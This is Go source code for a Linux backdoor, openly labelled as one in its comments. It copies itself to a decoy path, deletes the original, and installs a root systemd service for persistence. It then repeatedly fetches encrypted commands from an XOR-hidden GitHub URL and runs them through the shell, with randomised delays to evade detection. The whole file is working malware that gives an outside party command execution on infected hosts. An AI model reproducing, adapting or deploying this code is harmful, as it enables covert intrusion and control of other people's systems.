package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

var xorKey = []byte{0xAF, 0x22, 0xC3, 0x11}  // xor mask
var xorKey2 = []byte{0x5A, 0x3C, 0x7E, 0x9D} // xor mask

// note: these are obfuscations, not encryptions

// this is a simple XOR-obfuscated version of the key (using xorKey) to obfuscate the encryption key in a compiled binary.
var scrambledKey = []byte{0x99, 0x15, 0xf5, 0x28, 0x9d, 0x15, 0xa7, 0x24, 0x9f, 0x12, 0xfb, 0x25, 0xca, 0x43, 0xf2, 0x23, 0xce, 0x47, 0xf5, 0x23, 0x9c, 0x40, 0xf4, 0x26, 0xc9, 0x40, 0xf5, 0x26, 0x9c, 0x47, 0xf4, 0x72, 0xca, 0x15, 0xa2, 0x29, 0x99, 0x17, 0xf5, 0x25, 0x9d, 0x16, 0xf4, 0x22, 0x9b, 0x43, 0xa1, 0x75, 0x99, 0x14, 0xfb, 0x22, 0xcc, 0x14, 0xa0, 0x29, 0xce, 0x11, 0xfb, 0x27, 0x9b, 0x11, 0xf7, 0x72}

// this is a simple XOR-obfuscated version of the url (using xorKey2) to the command file on github to obfuscate the url in a compiled binary
var scrambledCmdURL = []byte{0x32, 0x48, 0xa, 0xed, 0x29, 0x6, 0x51, 0xb2, 0x28, 0x5d, 0x9, 0xb3, 0x3d, 0x55, 0xa, 0xf5, 0x2f, 0x5e, 0xb, 0xee, 0x3f, 0x4e, 0x1d, 0xf2, 0x34, 0x48, 0x1b, 0xf3, 0x2e, 0x12, 0x1d, 0xf2, 0x37, 0x13, 0x2d, 0xe8, 0x28, 0x5d, 0x17, 0xf3, 0x9, 0x5d, 0x17, 0xfa, 0x3b, 0x50, 0x51, 0xfe, 0x68, 0x11, 0xe, 0xef, 0x35, 0x56, 0x1b, 0xfe, 0x2e, 0x11, 0x1b, 0xe9, 0x32, 0x55, 0x1d, 0xfc, 0x36, 0x13, 0xc, 0xf8, 0x3c, 0x4f, 0x51, 0xf5, 0x3f, 0x5d, 0x1a, 0xee, 0x75, 0x51, 0x1f, 0xf4, 0x34, 0x13, 0x1d, 0xf2, 0x37, 0x51, 0x1f, 0xf3, 0x3e, 0x4f, 0x50, 0xe9, 0x22, 0x48}

func main() {
	curPath, _ := os.Executable()
	targetPath := "/usr/local/bin/sys_update" // this is where we want the backdoor to actually be located (sys_update is a decoy name)

	if curPath != targetPath { // we haven't installed ourself yet

		// copy binary with executable permissions to target path
		input, _ := os.ReadFile(curPath)
		if err := os.WriteFile(targetPath, input, 0755); err != nil {
			fmt.Println("Error installing:", err)
			os.Exit(1)
		}

		err := StartService(targetPath)
		if err != nil {
			fmt.Println("Error starting service:", err)
			os.Exit(1)
		}

		// delete the original binary to cover our tracks
		os.Remove(curPath)
	} else { // we're already installed and running in a service, let's commence mischief >:)
		BackdoorLoop()
	}
}

// create a service that will automatically restart the backdoor if it's killed, and more importantly, will make it run on startup to maintain persistence
func StartService(binPath string) error {
	servicePath := "/etc/systemd/system/sys_update.service"

	content := fmt.Sprintf(`[Unit]
Description=System Service Loader
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
`, binPath)

	err := os.WriteFile(servicePath, []byte(content), 0644)
	if err != nil {
		return err
	}

	// activate the service
	exec.Command("systemctl", "daemon-reload").Run()
	exec.Command("systemctl", "enable", "sys_update.service").Run()
	exec.Command("systemctl", "start", "sys_update.service").Run()

	return nil
}

// This is the backdoor loop that continuously fetches the command file, decrypts it, executes the commands, and writes the output back to github. It includes a random delay to avoid pattern detection. We only run once the binary has "self-installed" itself on the target machine.
func BackdoorLoop() {
	key, cmdURL := string(XORTransform(scrambledKey, xorKey)), string(XORTransform(scrambledCmdURL, xorKey2))
	for {
		commandEncrypted, err := FetchCommandFileFromGitHub(cmdURL)
		if err != nil {
			fmt.Println("Error fetching command file:", err)
			return
		}

		commandStr, err := DecryptString(commandEncrypted, key)
		if err != nil {
			fmt.Println("Error decrypting command:", err)
			return
		}

		commands := strings.Split(commandStr, "\n")
		outputs := make([]string, 0, len(commands))

		// run each command and store the output
		for _, command := range commands {
			command = strings.TrimSpace(command)
			if command == "" {
				continue
			}

			run := exec.Command("sh", "-c", command)
			output, err := run.CombinedOutput()
			if err != nil {
				fmt.Println("Error executing command:", err)
			}
			outputs = append(outputs, string(output))
		}

		// append outputs to a file
		outputContent := strings.Join(outputs, "\n")
		err = os.WriteFile("/tmp/cmd_output.txt", []byte(outputContent), 0644)
		if err != nil {
			fmt.Println("Error writing output file:", err)
			return
		}

		time.Sleep(time.Second * time.Duration((60 + (rand.Intn(21) - 10)))) // 50-70s, random delay to avoid periodicity detection
	}
}

// Fetches encrypted command file from github
func FetchCommandFileFromGitHub(commandsUrl string) (string, error) {
	resp, err := http.Get(commandsUrl)
	if err != nil {
		fmt.Println("Error fetching file:", err)
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		fmt.Println("Failed to fetch file. Status:", resp.Status)
		return "", fmt.Errorf("failed to fetch file: %s", resp.Status)
	}

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		fmt.Println("Error reading response:", err)
		return "", err
	}

	return string(body), nil
}

// takes base64 ciphertext and hex key, return decrypted plaintext using AES-GCM
func DecryptString(cryptoText string, keyHex string) (string, error) {
	// decode key into bytes
	key, err := hex.DecodeString(keyHex)
	if err != nil || len(key) != 32 {
		return "", fmt.Errorf("invalid key: must be 32 bytes")
	}

	// decode base64 ciphertext
	ciphertext, err := base64.StdEncoding.DecodeString(cryptoText)
	if err != nil {
		return "", fmt.Errorf("base64 decode failed: %v", err)
	}

	// initialize cipher
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	// remove nonce
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize {
		return "", fmt.Errorf("ciphertext too short")
	}

	nonce, actualCiphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]

	// decrypt
	plaintext, err := gcm.Open(nil, nonce, actualCiphertext, nil)
	if err != nil {
		// will fail if wrong key or tampered ciphertext
		return "", fmt.Errorf("decryption/auth failed: %v", err)
	}

	return string(plaintext), nil
}

// XORTransform toggles the bits. Running it twice restores the original.
func XORTransform(input []byte, key []byte) []byte {
	output := make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		// Use the modulo operator (%) to loop the key if it's shorter than the input
		output[i] = input[i] ^ key[i%len(key)]
	}
	return output
}
